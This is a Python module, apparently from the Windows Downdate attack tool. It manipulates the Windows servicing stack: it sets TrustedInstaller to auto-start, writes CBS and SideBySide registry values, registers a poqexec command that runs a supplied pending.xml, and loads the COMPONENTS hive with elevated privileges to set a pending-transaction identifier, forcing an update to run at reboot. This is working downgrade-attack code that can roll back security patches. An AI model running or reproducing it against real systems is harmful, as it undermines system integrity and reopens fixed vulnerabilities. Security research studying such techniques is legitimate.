import os
import winreg
from typing import Tuple

import win32api
import win32security
import win32service

from windows_downdate.privilege_utils import enable_privilege
from windows_downdate.registry_utils import set_reg_value, get_reg_values
from windows_downdate.resource_utils import get_first_resource_language
from windows_downdate.service_utils import set_service_start_type
from windows_downdate.winlogon_utils import set_winlogon_notification_event
from windows_downdate.xml_utils import load_xml_from_buffer, ET

CBS_REGISTRY_PATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing"

SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\\Configuration"

POQEXEC_PATH = "%SystemRoot%\\System32\\poqexec.exe"

COMPONENTS_HIVE_PATH = "%SystemRoot%\\System32\\Config\\COMPONENTS"

RT_WCP_BASE_MANIFEST = 614
RN_WCP_BASE_MANIFEST = 1

EMPTY_PENDING_XML = """<?xml version='1.0' encoding='utf-8'?>
<PendingTransaction Version="3.1" WcpVersion="10.0.22621.2567 (WinBuild.160101.0800)" Identifier="916ae75edb30da0146730000dc1be027">
\t<Transactions>
\t</Transactions>
\t<ChangeList>
\t</ChangeList>
\t<POQ postAction="reboot">
\t</POQ>
\t<POQ>
\t</POQ>
\t<InstallerQueue Length="0x00000000">
\t</InstallerQueue>
\t<RollbackInformation>
\t\t<AdminHints>
\t\t</AdminHints>
\t</RollbackInformation>
</PendingTransaction>"""


def get_empty_pending_xml() -> ET.ElementTree:
    return load_xml_from_buffer(EMPTY_PENDING_XML)


def set_trusted_installer_auto_start() -> None:
    set_service_start_type("TrustedInstaller", win32service.SERVICE_AUTO_START)


def register_winlogon_notification() -> None:
    set_winlogon_notification_event("TrustedInstaller", "CreateSession")


def set_servicing_in_progress() -> None:
    cbs_interface_registry_path = f"{CBS_REGISTRY_PATH}\\Interface"
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  cbs_interface_registry_path,
                  "ServicingInProgress",
                  1, winreg.REG_DWORD)


def register_poqexec_cmd(poqexec_cmd: str) -> None:
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH,
                  "PoqexecCmdline",
                  [poqexec_cmd],
                  winreg.REG_MULTI_SZ)


def load_components_hive() -> None:
    # Make sure the required privileges for loading the hive are held
    enable_privilege(win32security.SE_BACKUP_NAME)
    enable_privilege(win32security.SE_RESTORE_NAME)

    components_hive_path_exp = os.path.expandvars(COMPONENTS_HIVE_PATH)
    winreg.LoadKey(winreg.HKEY_LOCAL_MACHINE, "COMPONENTS", components_hive_path_exp)


def set_pending_xml_identifier(pending_xml_identifier: bytes) -> None:
    # TODO: Theres gotta be a better way, ctypes.create_unicode_string?
    pending_xml_identifier_unicode = b"\x00".join(bytes([byte]) for byte in pending_xml_identifier) + b"\x00"
    set_reg_value(winreg.HKEY_LOCAL_MACHINE,
                  "COMPONENTS",
                  "PendingXmlIdentifier",
                  pending_xml_identifier_unicode,
                  winreg.REG_BINARY)


def pend_update(pending_xml_path: str) -> None:
    set_trusted_installer_auto_start()

    # Requires TrustedInstaller, can be skipped
    register_winlogon_notification()

    # Requires TrustedInstaller, can be skipped
    set_servicing_in_progress()

    poqexec_path_exp = os.path.expandvars(POQEXEC_PATH)
    poqexec_cmd = f"{poqexec_path_exp} /display_progress {pending_xml_path}"
    register_poqexec_cmd(poqexec_cmd)

    load_components_hive()

    # TODO: Load identifier in runtime
    pending_xml_identifier = b"916ae75edb30da0146730000dc1be027"
    set_pending_xml_identifier(pending_xml_identifier)


def get_servicing_stack_info() -> Tuple[str, str, int]:
    cbs_version_registry_path = f"{CBS_REGISTRY_PATH}\\Version"
    cbs_version_key = get_reg_values(winreg.HKEY_LOCAL_MACHINE, cbs_version_registry_path)
    if len(cbs_version_key) > 1:
        raise Exception("CBS Version key is not expected to have more then one value")
    servicing_version, servicing_path, servicing_version_reg_type = cbs_version_key[0]
    servicing_path_exp = os.path.expandvars(servicing_path)
    return servicing_version, servicing_path_exp, servicing_version_reg_type


def get_servicing_stack_path() -> str:
    _, servicing_stack_path, _ = get_servicing_stack_info()
    return servicing_stack_path


def get_wcp_base_manifest() -> bytes:
    servicing_stack_path = get_servicing_stack_path()
    wcp_dll_path = f"{servicing_stack_path}\\wcp.dll"
    wcp_module = win32api.LoadLibrary(wcp_dll_path)
    return get_first_resource_language(wcp_module, RT_WCP_BASE_MANIFEST, RN_WCP_BASE_MANIFEST)
